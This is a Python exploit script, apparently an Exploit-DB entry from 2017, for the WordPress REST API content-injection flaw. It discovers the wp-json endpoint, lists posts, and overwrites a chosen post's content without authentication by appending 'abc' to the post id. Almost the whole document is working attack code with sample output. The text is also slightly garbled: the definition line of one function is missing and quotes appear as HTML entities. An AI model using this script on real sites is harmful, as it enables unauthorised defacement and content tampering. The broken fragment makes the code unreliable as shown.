# Date: 2017-02-02
# Exploit Author: @leonjza
# Tested on: Debian Jessie
#
# PoC gist: https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab
#
 
# 2017 - @leonjza
#
 
# Usage example:
#
# List available posts:
#
# $ python inject.py http://localhost:8070/
# * Discovering API Endpoint
# * API lives at: http://localhost:8070/wp-json/
# * Getting available posts
#  - Post ID: 1, Title: test, Url: http://localhost:8070/archives/1
#
# Update post with content from a file:
#
# $ cat content
# foo
#
# $ python inject.py http://localhost:8070/ 1 content
# * Discovering API Endpoint
# * API lives at: http://localhost:8070/wp-json/
# * Updating post 1
# * Post updated. Check it out at http://localhost:8070/archives/1
# * Update complete!
 
import json
import sys
import urllib2
 
from lxml import etree
 
 
 
    data = etree.HTML(response.read())
    u = data.xpath(&#039;//link[@rel="https://api.w.org/"]/@href&#039;)[0]
 
    # check if we have permalinks
    if &#039;rest_route&#039; in u:
        print(&#039; ! Warning, looks like permalinks are not enabled. This might not work!&#039;)
 
    return u
 
 
def get_posts(api_base):
    respone = urllib2.urlopen(api_base + &#039;wp/v2/posts&#039;)
    posts = json.loads(respone.read())
 
    for post in posts:
        print(&#039; - Post ID: {}, Title: {}, Url: {}&#039;
              .format(post[&#039;id&#039;], post[&#039;title&#039;][&#039;rendered&#039;], post[&#039;link&#039;]))
 
 
def update_post(api_base, post_id, post_content):
    # more than just the content field can be updated. see the api docs here:
    data = json.dumps({
        &#039;content&#039;: post_content
    })
 
    url = api_base + &#039;wp/v2/posts/{post_id}/?id={post_id}abc&#039;.format(post_id=post_id)
    req = urllib2.Request(url, data, {&#039;Content-Type&#039;: &#039;application/json&#039;})
    response = urllib2.urlopen(req).read()
 
    print(&#039;* Post updated. Check it out at {}&#039;.format(json.loads(response)[&#039;link&#039;]))
 
 
def print_usage():
    print(&#039;Usage: {} <url> (optional: <post_id> <file with post_content>)&#039;.format(__file__))
 
 
if __name__ == &#039;__main__&#039;:
 
    # ensure we have at least a url
    if len(sys.argv) < 2:
        print_usage()
        sys.exit(1)
 
    # if we have a post id, we need content too
    if 2 < len(sys.argv) < 4:
        print(&#039;Please provide a file with post content with a post id&#039;)
        print_usage()
        sys.exit(1)
 
    print(&#039;* Discovering API Endpoint&#039;)
    api_url = get_api_url(sys.argv[1])
    print(&#039;* API lives at: {}&#039;.format(api_url))
 
    # if we only have a url, show the posts we have have
    if len(sys.argv) < 3:
        print(&#039;* Getting available posts&#039;)
        get_posts(api_url)
 
        sys.exit(0)
 
    # if we get here, we have what we need to update a post!
    print(&#039;* Updating post {}&#039;.format(sys.argv[2]))
    with open(sys.argv[3], &#039;r&#039;) as content:
        new_content = content.readlines()
 
    update_post(api_url, sys.argv[2], &#039;&#039;.join(new_content))
 
    print(&#039;* Update complete!&#039;)

